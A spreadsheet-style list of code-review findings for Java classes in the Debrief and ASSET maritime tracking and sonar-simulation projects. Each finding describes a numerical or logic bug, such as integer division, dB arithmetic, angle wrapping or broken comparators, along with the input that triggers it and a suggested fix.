CR-111,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.ambiguity,AmbiguityResolver,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/ambiguity/AmbiguityResolver.java,algorithm-correctness,division-by-zero,Medium,High,candidate,Integer-second time delta gives divide-by-zero rates for sub-second or duplic...,"timeDeltaSecs is computed with integer division (millis/1000L), so two cuts less than one second apart, or two cuts with the same DTG, give timeDeltaSecs==0. gapRate = |valueDelta/0| becomes Infinity (or NaN when valueDelta==0) and brgRate likewise; Infinity > minZig forces a zig, NaN silently fails every comparison. Neither case is guarded and the caller receives wrong leg boundaries with no error.",L1221-L1224; L1235-L1238,.rep with SENSOR2 lines at 500 ms spacing (e.g. 120000.000 and 120000.500) or two cuts with identical DTG on one towed-array sensor.,Compute the delta in double seconds (millis/1000d) and skip or merge cuts whose time delta is <= 0.,S,Requires noticing the long division and tracing how Infinity/NaN propagate through the threshold logic.,-,
CR-112,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.ambiguity,AmbiguityResolver,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/ambiguity/AmbiguityResolver.java,bug,degenerate-input,Medium,High,candidate,resolve() crashes on empty legs and silently skips single legs; chunkFor can ...,"getPermutations()/midTimeFor() call leg.get(0) and leg.get(size-1) without checking for an empty LegOfCuts, and valueAt() dereferences the null curve that getCurve() returns for an empty leg (IndexOutOfBounds / NPE). With exactly one leg walkScores() produces a single empty ScoreList so the leg is never resolved and an empty list is returned without warning. chunkFor(len,9) returns -1 for len in {723,1009,1028,...} (python enumerated 25 values < 5000) so subList(0,-1) throws.",L1000; L1026-L1032; L1003-L1004; L1497-L1499; L904-L920; L1044-L1063,"Resolve Ambiguity with an ownship zone dragged over a period containing no visible TA cuts (BearingResidualsView.resolveAmbiguousCutsB builds an empty LegOfCuts for it), or with a single zone.",Filter out empty legs (and legs with < 3 cuts) before getPermutations; handle the single-leg case explicitly; make chunkFor fall back to MAX_CHUNK_SIZE instead of -1.,S,Requires following the call chain from the UI zone list into the permutation code.,-,
CR-113,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.freq,DopplerCurveFinMath,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/freq/DopplerCurveFinMath.java,bug,swallowed-exception,Medium,High,candidate,"SolverException swallowed, then null parameters dereferenced","The Levenberg-Marquardt run is wrapped in try/catch(SolverException) that only prints the stack trace; _modelParameters stays null and the very next line constructs FourParameterLogisticSecondDrivative(null) whose value() throws NullPointerException from inside BisectionSolver, so the 'Calculate base frequency' action fails with an unrelated NPE instead of a message. Normaliser also divides by _range which is 0 when all frequencies (or all times) are identical, feeding NaN into the fit.",L110-L116; L118-L119,"Frequency cuts that cannot be fitted by the 4PL model (e.g. two cuts, or all cuts with identical frequency so Normaliser._range==0).","Rethrow as IllegalArgumentException with a user-facing message, and validate _range>0 and >=5 samples up front.",S,"grep-able for printStackTrace, but the downstream null path needs reading.",-,
CR-114,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.freq,DopplerCurveFinMath,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/freq/DopplerCurveFinMath.java,algorithm-correctness,statistical-error,Medium,Medium,unverified-needs-runtime,Inflection found by BisectionSolver with no root-bracketing check,"Commons-math BisectionSolver.solve(maxEval, f, min, max, start) does not verify that f changes sign on [min,max]; if the fitted sigmoid's second derivative has no zero in the normalised time range (all cuts before or after CPA, or a monotone fit) the solver just converges to an endpoint (0.01 or 1) and returns it. inflectionTime is then the first/last cut time and inflectionFreq the curve value there - a plausible-looking but wrong F-nought that FrequencyResidualsView writes into the sensor. DopplerCurve (Apache LM variant, L158-L159) has the same issue with [0,1] where x=0 makes Math.pow(0,b-2) infinite.",L118-L120; L65-L68,Calculate base frequency on a frequency series that is monotonically decreasing without a CPA in the visible range.,Check sign(f(min)) != sign(f(max)) (or use BracketingNthOrderBrentSolver with a bracket search) and report 'no inflection in range' instead of a value.,M,Requires knowing the solver's contract and the shape of the 4PL second derivative.,-,
CR-115,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.views,BaseStackedDotsView,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/views/BaseStackedDotsView.java,algorithm-correctness,unit-mismatch,Medium,High,verified,Default TMA leg offset built with Math.toDegrees(135) where WorldVector expec...,"setLeg() creates the fallback offset for a newly generated target leg as new WorldVector(Math.toDegrees(135), 2 NM, 0). WorldVector's bearing argument is in radians, so the value 7734.93 rad is used; modulo 2*pi this is a bearing of ~18.9 degrees (python), not the intended 135. Every auto-created leg without a preceding RelativeTMASegment (first slice of a target track) is therefore placed 2 NM at ~019 from ownship instead of 135, silently.",L3298-L3300,"Target slicing when the secondary track has no existing RelativeTMASegment, or when the previous segment has no fixes/no matching ownship fix.",Use Math.toRadians(135).,S,Only detectable by knowing the WorldVector constructor's units and evaluating the expression.,-,
CR-116,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.views,BearingResidualsView,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/views/BearingResidualsView.java,algorithm-correctness,logic-error,Medium,Medium,candidate,Legs handed to the ambiguity resolver mix cuts from every visible sensor,"resolveAmbiguousCutsB() builds each LegOfCuts with StackedDotHelper.getBearings(primary, true, period), i.e. every visible sensor's cuts in the zone (hull sonar, towed array, etc.). LegOfCuts.getCurve(CORE) then fits one quadratic through interleaved bearing series from different sensors, and the resulting slope/extrapolation used for scoring the CORE/AMBIGUOUS permutations is meaningless; the auto-slicer path (OwnshipZoneSlicer) works per-sensor so the two paths disagree.",L1224-L1233,Ownship with two visible sensors (e.g. hull sensor with plain bearings plus TA with ambiguous bearings) and ownship zones present; press Resolve Ambiguity.,"Build one LegOfCuts per (zone, sensor) and only include cuts that have an ambiguous bearing; skip legs with fewer than 3 cuts.",M,Needs cross-file reasoning about what getBearings returns versus what getCurve assumes.,-,
CR-117,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.views,FrequencyResidualsView,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/views/FrequencyResidualsView.java,bug,degenerate-input,Medium,Medium,candidate,NaN base frequency written to sensor; zero step loops forever in calcSeries,"calculateBaseFreq accepts whatever DopplerCurveFinMath returns: when the fit yields NaN (e.g. constant frequencies -> Normaliser range 0) the guard 'baseFreq != oldFreq' is true for NaN and setBaseFrequency(NaN) is persisted to the sensor, after which every predicted frequency and residual becomes NaN. calcSeries computes step=(end-start)/30 in long millis; a visible range shorter than 30 ms gives step 0 and 'for (t=start; t<=end; t+=step)' never terminates.",L271-L279; L221-L223,Sensor whose visible frequency cuts all read the same value (e.g. 150.00 Hz) then press 'Calculate base frequency'; or zoom the frequency plot to a <30 ms window.,"Reject NaN/infinite baseFreq with a message before assigning; use Math.max(1, step).",S,Needs to trace NaN from Normaliser through the fit to the persisted sensor property.,-,
CR-118,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.moving_average,TimeRestrictedMovingAverage,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/moving_average/TimeRestrictedMovingAverage.java,bug,logic-error,Medium,High,verified,"Window eviction uses removeAll by value, desynchronising _times and _values","add() collects the values of out-of-window entries and calls _values.removeAll(removeValues). List.removeAll removes every element equal to any listed value, so an in-window entry whose score equals an evicted score is also removed, while its time stays in _times. From then on getAverage()/getVariance()/lastValue() are computed over the wrong set and isPopulated() (size of _times) disagrees with _values. Used by ZigDetector.runThrough on the default target-slicing path where identical scores (e.g. 0.0) are common. Python check: values [0.5,0.5,0.7] at t=0,100,200, window 150, new t=260 -> both 0.5 removed although t=100 is in-window.",L128-L141,Two fits within the window returning the same RMS score while an older entry with that score expires.,"Remove by index (iterate backwards and remove(i) from both lists) or store (time,value) pairs in one list.",S,Requires knowing List.removeAll semantics and that scores repeat; not a pattern a grep would flag.,-,
CR-119,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship.alternate,SCAlgorithms,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/alternate/SCAlgorithms.java,algorithm-correctness,precision-loss,Medium,High,verified,Integer division inside sqrt(numelements/(numelements-1)) makes the correctio...,"areDeviationsInAllowedLimits (both overloads) computes Math.sqrt(numelements / (numelements - 1)) with int operands, so for n>=3 the quotient truncates to 1 and the intended factor sqrt(n/(n-1)) is never applied (python: n=3 -> 1.0 vs 1.2247, n=10 -> 1.0 vs 1.054). The Student test statistic is therefore systematically too small and outlier deviations up to ~22% (n=3) larger than the statistical limit are accepted as 'steady'. This is on the production ownship slicing path (fifo_maxdev/sieve_maxdev via AlternateLegWrapper).",L223; L255,Any steady-interval test with 3..20 fixes containing a marginal outlier heading.,Cast to double: Math.sqrt((double) numelements / (numelements - 1)).,S,Integer division inside a floating expression is easy to miss and its statistical effect requires reasoning.,-,
CR-120,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,algorithm-correctness,angle-wrap,Medium,Medium,candidate,walkThisEnd compares unwrapped measured bearing with 0..360 forecast without ...,"prepareBearings() unwraps the bearing series (values such as -6 or 364 are produced, see testCleanValues), but FlanaganArctan.calcForecast() returns values in [0,360). In walkThisEnd the error is predictedB - measuredB with only a special case for measured<0 && predicted>0 && |err|>100; a measured value of 364 against a forecast of 4 gives an error of -360, flips thisAbove and inflates absError, so the grow/stop decision for the leg end is wrong near north.",L1958-L1970; L156-L159; L1849-L1891,"Target bearing series crossing north, e.g. 355, 4, 2, 349 (unwrapped to 355,364,362,349) inside the leg being grown.","Fold the error into [-180,180) (as FlanaganArctan.function already does) before using it, and drop the ad-hoc measured<0 test.",S,"Needs to connect the unwrapped domain produced in one method with the [0,360) domain produced in another.",-,
CR-121,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,bug,performance,Medium,High,candidate,runThrough re-runs Nelder-Mead over the growing window per cut and prints eve...,"For every cut index 'end' runThrough calls optimiseThis() (Nelder-Mead, Nmax=116400) over subList(start,end), and FlanaganArctan.function is O(window) per evaluation, so the default target slicer (sliceTarget -> sliceThis, chosen because USE_HOLISTIC_SLICER has no default) is O(n^2 * iterations) per ownship leg and is run forward and backward. It also System.out.println's every forecast for every fit (L2110-L2120) and logs 'scores:' lines, and growLeg/runThrough2 log to the Eclipse error log on each step. This runs on the UI thread from the slice action.",L2080-L2120; L1812-L1840; L2313-L2316; L2397-L2398,Ownship leg containing ~1000 sensor cuts; press the target 'slice' button.,"Remove the per-cut println/log calls, cap the fit window (the commented-out 'end-20' line), and run slicing in a Job with progress.",M,Complexity is only evident from the nested optimiser call inside the per-cut loop.,-,
CR-122,A8,org.mwc.asset.legacy,ASSET.Models.Decision,Switch,org.mwc.asset.legacy/src/ASSET/Models/Decision/Switch.java,bug,degenerate-input,Medium,High,candidate,Switch.decide uses elementAt(index-1) with default index 0 -> ArrayIndexOutOf...,"_selectedActivity defaults to 0 (L136) while decide indexes _myDecisions.elementAt(getIndex()-1) (L167); a Switch behaviour without an explicit Index (or with Index larger than the number of children) crashes the scenario step with ArrayIndexOutOfBoundsException, which CoreScenario does not catch for decisions.",L136; L167,Scenario XML with a <Switch> behaviour lacking the Index attribute or with fewer children than Index.,Validate index range in decide (return null / log) and default to 1.,S,grep-able,-,
CR-123,A8,org.mwc.asset.legacy,ASSET.Models.Detection,DetectionList,org.mwc.asset.legacy/src/ASSET/Models/Detection/DetectionList.java,bug,null-deref,Medium,High,candidate,Copy constructor leaves _thePeriod null; nearest/most-recent lookups NPE or t...,"DetectionList(Collection) (L192-L194) does not initialise _thePeriod, so add()/extend()/getTimeCoverage() on such a list NPE (L207, L222). SensorList.detects builds one at L248. getNearestDetection filters on getEstimatedRange()!=null but the comparator dereferences getRange() (L398-L400), which is null for bearing-only sensors (canProduceRange=false) whose getEstimatedRange is a constant (BroadbandSensor L218-L220) -> NPE; getBestDetection/getMostRecentDetection call ss.last() on an empty set (L257, L378) -> NoSuchElementException, and their TreeSets collapse equal-key events so the returned element is arbitrary.",L192-L194; L207; L257; L378; L389-L423,Decision behaviour calling detections.getNearestDetection() with two bearing-only broadband contacts.,Initialise _thePeriod in the copy constructor; compare on getEstimatedRange(); return null for empty lists.,S,Requires cross-checking filter vs comparator field.,-,
CR-124,A8,org.mwc.asset.legacy,ASSET.Models.Environment.Mediums,BroadbandMedium,org.mwc.asset.legacy/src/ASSET/Models/Environment/Mediums/BroadbandMedium.java,algorithm-correctness,unit-mismatch,Medium,High,candidate,"Propagation loss mixes metres and yards: absorption dB/kyd applied to km, spr...","getLossBetween converts range with Degs2m (metres) into a variable named rng_yds (L60) and then applies ABSORPTION_COEFFICIENT_DB_PER_KY (dB per kiloyard) to rng_yds/1000 (L71-L74), i.e. per kilometre; the 20*log10 spreading term is also referenced to 1 m instead of 1 yd. Absorption is under-estimated by ~9% and spreading offset by 0.78 dB, shifting every passive/active detection range in the environment model.",L60; L68-L74,Target at 20 kyd (18288 m): code returns 20log10(18288)+0.08*18.288=86.7 dB; the intended yards formula gives 20log10(20000)+0.08*20=87.6 dB.,Use Conversions.Degs2Yds(rng_degs) for rng_yds (or rename and change the coefficient to dB/km consistently).,S,Requires matching the variable/constant units against the conversion actually called.,-,
CR-125,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Cookie,TypedCookieSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Cookie/TypedCookieSensor.java,algorithm-correctness,nondeterminism,Medium,High,candidate,Bearing noise drawn from a fresh unseeded java.util.Random on every detection,"When ApplyNoise is set, detectThis creates 'new Random()' per detection (L517) and adds MEAN + nextGaussian()*STANDARD_DEVIATION. The noise ignores RandomGenerator.seed(), so noisy-bearing runs are not reproducible; creating a Random per call is also needlessly slow.",L515-L518,Cookie-cutter sensor with ApplyNoise=true under a seeded Monte-Carlo run: bearings differ between repeated runs.,Use RandomGenerator.generateNormalValue(STANDARD_DEVIATION) + MEAN.,S,grep-able,-,
CR-126,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Cookie,TypedCookieSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Cookie/TypedCookieSensor.java,algorithm-correctness,logic-error,Medium,High,candidate,Detection-period gating applies only once per target: _timesGained never clea...,"When a doublet has a Period, the first time a target comes in range its gain time is recorded (L490) and detection suppressed until 'required' elapses. The removal on losing contact is commented out (L469-L473) and restart() is not overridden, so once a target has ever been in range, all later regains (and all subsequent Monte-Carlo restarts of the same scenario object) detect instantly. The intended 'time-to-gain' behaviour silently degrades after the first contact.",L466-L497,"Cookie sensor with Period=5 min; target enters range, leaves, re-enters: second entry is detected at the first scan.",Remove the target's entry from _timesGained when not detected; clear _timesGained in an overridden restart().,S,Requires understanding intended state machine; commented-out line is a hint.,-,
CR-127,A8,org.mwc.asset.legacy,ASSET.Models.Sensor,CoreSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/CoreSensor.java,bug,performance,Medium,High,candidate,Sensor-offset back-track grows without bound: a fix is appended for every tar...,"getHostLocationFor is called from detectThis for every candidate target each scan; when a sensor offset is set it appends a new FixWrapper to _backTrack every call (L472-L476) and never trims it, so a long run with N targets adds N fixes per step (many at identical times) and memory/lookup cost grows linearly for the whole scenario; restart only clears it between runs (L657-L660).",L467-L499,"Towed-array sensor with SensorOffset set, 20 targets, 1 s step, 12 h run: ~860k fixes retained in one TrackWrapper.","Add one fix per (participant,time) and prune fixes older than the array length + margin.",S,Requires understanding call frequency of the method.,-,
CR-128,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Initial,ActiveBroadbandSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Initial/ActiveBroadbandSensor.java,algorithm-correctness,logic-error,Medium,Medium,candidate,Active sonar only 'detects' targets that radiate passive noise and omits targ...,"canDetectThisType returns other.radiatesThisNoise(BROADBAND_PASSIVE) (L167-L171), so a silent target (no BroadbandRadNoise) is never candidate for active detection; getTgtNoise returns the sensor's own source level (L236-L240) with no target-strength term, so the active sonar equation is SL - 2TL - NL + DI - DT with TS fixed at 0 dB and all targets equally reflective. Combined with SensorList.getRadiatedNoiseFor the transmission also does not count as radiated noise for passive listeners (medium mismatch).",L167-L171; L196-L200; L236-L240,Scenario with an ActiveBroadbandSensor and a target without any radiated-noise characteristics: no detections ever.,Gate on the target having reflected characteristics (Medium.reflectedEnergyFor) and add a TS term from RadiatedCharacteristics.reflectedEnergyFor.,M,Requires sonar-equation knowledge.,-,
CR-129,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Initial,InitialSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Initial/InitialSensor.java,algorithm-correctness,unit-mismatch,Medium,High,candidate,Sonar equation subtracts own-ship and background noise separately in dB inste...,"detectThis computes fom = tgtNoise - (osNoise - di) - rd - bkNoise (L177). Two noise levels in dB cannot be subtracted independently: the noise term should be the power sum NL = 10log10(10^(os/10)+10^(bk/10)). With realistic values (os 60 dB, bk 35 dB) the code removes 95 dB where the physics removes ~60 dB, so signal excess is under-estimated by tens of dB whenever self noise is non-zero. (Today this is masked because CoreParticipant.getSelfNoiseFor returns 0; fixing that bug exposes this one.) CoreSensor.SensorUtils.powerSum (CoreSensor L112) exists but is unused here.",L169-L178,"BroadbandSensor host with SelfNoise 60 dB, environment bkgnd 35 dB, target 120 dB at short range: code gives SE = 120-(60-34)-2-35-loss = 57-loss; correct SE = 120-(60.01-34)-2-loss = 92-loss.","Replace '- (osNoise - di) - rd - bkNoise' with '- (SensorUtils.powerSum(osNoise, bkNoise) - di) - rd'.",S,Requires domain knowledge of the passive sonar equation; not greppable.,-,
CR-130,A8,org.mwc.asset.legacy,ASSET.Models.Sensor.Initial,InitialSensor,org.mwc.asset.legacy/src/ASSET/Models/Sensor/Initial/InitialSensor.java,algorithm-correctness,angle-wrap,Medium,Medium,candidate,Ambiguous-bearing selection compares a relative bearing with an absolute cour...,"RelBrg = bearing - course is not wrapped to +/-180 (L185-L186). handleAmbiguousBearing then decides which of the two bearings is 'true' with 'if (RelBrg < crse)' (L283), comparing a relative bearing (-360..360) against an absolute course (0..360); the outcome is arbitrary and flips as the host turns through north, swapping bearing and ambiguous bearing in DetectionEvent and thus in every downstream TMA/observer output. The wrap loop also uses '> 360' instead of '>= 360' (L277).",L185-L186; L271-L294,"Towed-array (setAmbiguous(true)) host on course 350 with a target at true bearing 010: RelBrg=-340, crse=350, so the true bearing is stored as the ambiguous one; on course 010 with target at 350 the assignment inverts.","Normalise RelBrg to (-180,180] once; choose the primary bearing by a stable rule (e.g. always store the true bearing in setBearing and mirror in setAmbiguousBearing) rather than comparing relative to absolute.",S,Requires reasoning about angular reference frames.,-,
CR-131,A8,org.mwc.asset.legacy,ASSET.Models.Sensor,SensorList,org.mwc.asset.legacy/src/ASSET/Models/Sensor/SensorList.java,algorithm-correctness,unit-mismatch,Medium,High,candidate,Active-sonar source levels and vessel radiated noise added arithmetically in dB,"getRadiatedNoiseFor sums source levels of all working active sensors with 'res += at.getSourceLevel()' (L366) and CoreParticipant.getRadiatedNoiseFor adds that to the vessel level ('vesselRadiated + sensorRadiated', CoreParticipant L648). Adding decibels linearly (e.g. 120 dB + 200 dB = 320 dB) massively over-states the target's radiated level, so any passive sensor 'hears' a pinging ship at absurd ranges. Additionally the medium filter at L359 never matches: active sensors report BROADBAND_ACTIVE (5) while passive queries ask for BROADBAND_PASSIVE (0), whereas radiatesThisMedium (L451-L466) ignores the medium entirely, so the two methods disagree about whether a pinging vessel radiates.",L350-L372; L451-L466; CoreParticipant L644-L650,Surface ship with BroadbandRadNoise 120 dB and a working ActiveBroadbandSensor SL 200 dB; passive detector queries radiated noise for BROADBAND_PASSIVE.,Combine levels with SensorUtils.powerSum; decide consistently which medium an active transmission pollutes and use the same test in getRadiatedNoiseFor and radiatesThisMedium.,S,Needs dB domain knowledge and cross-class tracing of medium constants.,-,
CR-132,A8,org.mwc.asset.legacy,ASSET.Participants,CoreParticipant,org.mwc.asset.legacy/src/ASSET/Participants/CoreParticipant.java,bug,api-misuse,Medium,High,candidate,Demanded sensor states after the first are never applied; restart() casts the...,"doMovement creates one iterator over the sensors (L426) outside the loop over demanded sensor states (L435-L445); after the first DemandedSensorStatus exhausts it, later states are silently ignored, so a decision that switches two sensors only switches one. restart() copies _participantDetectedListeners while casting it to Vector<ParticipantDecidedListener> (L797-L803), producing ClassCastException when a detected-only listener is iterated as a decided listener (and NPE when only decided listeners are registered).",L426-L445; L795-L804,Decision model issuing DemandedStatus with two DemandedSensorStatus entries (e.g. ChangeSensorLineUp for two mediums); scenario restart with a DetectionObserver attached but no decided listener.,Create the sensor iterator inside the per-state loop; clone _participantDecidedListeners at L797.,S,Copy-paste bugs visible only by reading the loop structure.,-,
CR-133,A8,org.mwc.asset.legacy,ASSET.Scenario.Genetic,Gene,org.mwc.asset.legacy/src/ASSET/Scenario/Genetic/Gene.java,bug,api-misuse,Medium,High,candidate,Genes share one XMLVarianceList (clone returns this); createRandom mutates it...,"Gene relies on XMLVarianceList.clone() and XMLVariance.clone(), but both return 'this' (XMLVarianceList L92-L97, XMLVariance L541-L546). Every Gene therefore aliases the same chromosome list; createRandom iterates that list while adding to it (L341-L349) which throws ConcurrentModificationException on a Vector iterator, and mergeWith mutates the shared objects. compareTo returns -1 for distinct genes of equal fitness (L322-L333), violating antisymmetry for the TreeSets in GeneticAlgorithm; equals casts without instanceof (L362) and hashCode is not overridden. getDocument() always returns null because _newDocument is a final null field (L274).",L274; L317; L322-L333; L341-L349; L362,Run GeneticAlgorithm.generate() with a population>1 on any variance file (only reachable from org.mwc.asset.test AllTests / GUI factory).,Implement real deep clones; randomise in place instead of appending; make compareTo consistent (compare fitness then identity); implement hashCode.,M,Requires following clone() into the callee to see it is a no-op.,-,
CR-134,A8,org.mwc.asset.legacy,ASSET.Scenario.Genetic,GeneticAlgorithm,org.mwc.asset.legacy/src/ASSET/Scenario/Genetic/GeneticAlgorithm.java,algorithm-correctness,logic-error,Medium,High,candidate,promote() sorts with a broken comparator and indexes past the array; sort() d...,"promote's Comparator returns '1 - compareTo' (L358): equal -> 1, greater -> 0, less -> 2, so it is not a valid ordering (TimSort may throw IllegalArgumentException) and the 'descending' sort is wrong; the trim loop then reads list[ii] for ii<_stars_size without checking list.length (L364-L365) and throws ArrayIndexOutOfBounds when fewer genes than stars exist. In step(), lowScoresHigh negates scores (L484-L485) so a legitimate score of 1.0 becomes -1.0 == INVALID_SCORE and is silently discarded by sort() (L435). TotalRunner starts from score=-1 so the product is negated (L142). _currentGene is a static shared field (L156).",L142; L156; L358; L364-L365; L435; L484-L485,"GA with stars_size=5 and 3 valid genes, or any runner returning exactly 1.0 with lowScoresHigh=true.","Use Collections.reverseOrder()/negated compareTo, bound the trim loop by list.length, and use a separate 'valid' flag instead of the -1 sentinel.",S,Requires reasoning about comparator contracts and sentinel collisions.,-,
CR-135,A8,org.mwc.asset.legacy,ASSET.Scenario.Observers,ProportionDetectedObserver,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/ProportionDetectedObserver.java,algorithm-correctness,statistical-error,Medium,Medium,candidate,"Target count never reset across restarts and never decremented, skewing propo...","_numTargets is only populated when it is 0 (L236) and incremented on every newParticipant matching the target type (L224), but is never reset in performSetupProcessing/restart and never decremented in participantRemoved. In a multi-run (restart) session any target-type participant created mid-run (e.g. launched weapons or buoys matching the type) inflates the denominator permanently, so getProportionDetected() and the batch statistic drift downward run after run.",L222-L226; L231-L242,Scenario restarted 10 times where a target-type participant is created during each run: denominator grows by one each restart.,Reset _numTargets in performSetupProcessing (recount from the scenario) and decrement in participantRemoved.,S,Requires reasoning about observer lifecycle across restarts.,-,
CR-136,A8,org.mwc.asset.legacy,ASSET.Scenario.Observers,ProximityObserver,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/ProximityObserver.java,algorithm-correctness,logic-error,Medium,High,candidate,Watch/target lists captured only at setup: participants created during the ru...,"performSetupProcessing snapshots matching participants into _watchVessels/_targetVessels (L575-L598) and step() only iterates those (L665-L680). The observer does not implement ParticipantsChangedListener, so a torpedo/weapon or sensor buoy created via scenario.createParticipant during the run (LaunchWeapon L939, LaunchSensor L229) is never range-checked, and StopOnProximityObserver never stops a scenario on a launched weapon's closest approach.",L575-L598; L665-L680,StopOnProximityObserver with WatchType=TORPEDO against a target when the torpedo is launched by a LaunchWeapon behaviour after start.,Register as ParticipantsChangedListener and add/remove from the lists on newParticipant/participantRemoved.,S,Requires knowing how weapons enter the scenario.,-,
CR-137,A8,org.mwc.asset.legacy,ASSET.Scenario.Observers,RemoveInAreaObserver,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/RemoveInAreaObserver.java,algorithm-correctness,unit-mismatch,Medium,High,candidate,Batch result converts a participant count with Degs2m and labels it 'range (m...,"performCloseProcessing submits '(int) Conversions.Degs2m(_myScore)' (L295) but _myScore is the number of removed participants (incremented in ditchThese L127), copied from ProximityObserver where the score is a range in degrees; the batch collator therefore records 111,120 per removed participant under the unit label 'range (metres)' (L335). restart() also resets _myScore to -1 (L343) whereas setup/close use 0, so the first removal after a restart is counted as 0.",L295; L301; L335; L343,Monte-Carlo run with RemoveInAreaObserver batch collation (AVERAGE): output shows 222240 for two removed vessels.,Submit _myScore directly with units 'participants'; reset to 0 in restart().,S,Requires recognising a copy-paste from a sibling class with different semantics.,-,
CR-138,A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,LocationOffset,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/LocationOffset.java,algorithm-correctness,logic-error,Medium,High,candidate,LocationOffset ignores RandomModel and fails to remove long/relative location...,"newPermutation always draws bearing and range uniformly (L204-L205) regardless of the RandomModel attribute read at L100 (a uniform range gives a centre-heavy density, and a Normal model is silently ignored). execute() tries to remove an existing location child but both branches test 'shortLocation' (L138-L144), so a longLocation or relativeLocation child is kept alongside the inserted shortLocation; which one the scenario reader honours is undefined.",L100; L138-L144; L202-L208,"Variance with <LocationOffset RandomModel=""Normal""> applied to a participant whose Location is given as longLocation.",Copy the three-way removal from LocationArea.execute (L123-L136) and honour _myRandomModel when drawing range/bearing.,S,Copy-paste duplicate condition is visible on reading; the ignored field needs data-flow tracing.,-,
CR-139,A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,XMLRange,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/XMLRange.java,algorithm-correctness,off-by-one,Medium,High,candidate,Stepped Range never generates its max value; step larger than range collapses...,"getNextRandom with a step computes num_steps=(int)((max-min)/step) and rnd in [0,num_steps-1], so the value max is unreachable (L280-L283). For min=0,max=90,step=30 only 0,30,60 are ever produced; when step>(max-min) num_steps is 0 and every permutation is min. Also step=0 divides by zero (Infinity cast to int) giving garbage. Uniform, non-stepped ranges are fine.",L274-L289,"Variance attribute <Range min=""0"" max=""90"" step=""30""/> with Number=1000: value 90 never appears.",Use num_steps = (int)Math.round((max-min)/step)+1 (guard step<=0) so both ends are inclusive.,S,Requires evaluating integer truncation semantics.,-,
CR-140,A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,XMLRange,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/XMLRange.java,algorithm-correctness,sign-error,Medium,High,candidate,merge() perturbation is always negative: value drifts to min during GA crossover,"merge computes var_2 = 2*0.05*(max-min) and adds '(var_2)*rand - (var_2)' (L319-L322), i.e. a perturbation uniformly in [-var_2, 0] instead of the intended symmetric [-variance, +variance]. Every crossover pushes the chromosome downward until clamped at min (L325-L326), biasing the genetic search.",L313-L327,Any GA run (GeneticAlgorithm.mutate -> Gene.mergeWith -> XMLRange.merge) with a Range chromosome; average of merged values decreases monotonically.,Use '_currentValue += var_2 * rand - variance;'.,S,Requires arithmetic reasoning about the intended distribution.,-,
CR-141,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.BRT,BRTImporter,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/BRT/BRTImporter.java,algorithm-correctness,angle-wrap,Medium,Medium,candidate,Ambiguous BRT bearing course-relBearing is never wrapped into 0-360 (negative...,"loadThese computes bearingDegs = course + relBearing and subtracts 360 once if >= 360, and ambigDegs = course - relBearing with the same >= 360 check only (L408-L418). Whenever the relative bearing exceeds the ownship course (e.g. course 010, rel 069) the ambiguous bearing is -59 and is stored as such in SensorContactWrapper; large relative bearings (>350 with a high course) can also leave values >= 720. Cuts outside the track's time span are silently skipped (L404) with no count reported.",L404-L430,"BRT file '1263297600.000000, 69.00' against a towed-array track whose course at that time is 010 deg",Normalise both bearings with ((x % 360) + 360) % 360 and report the number of skipped cuts.,S,Sign case is only apparent from the arithmetic; grep for '-= 360' would not reveal the missing negative branch.,-,
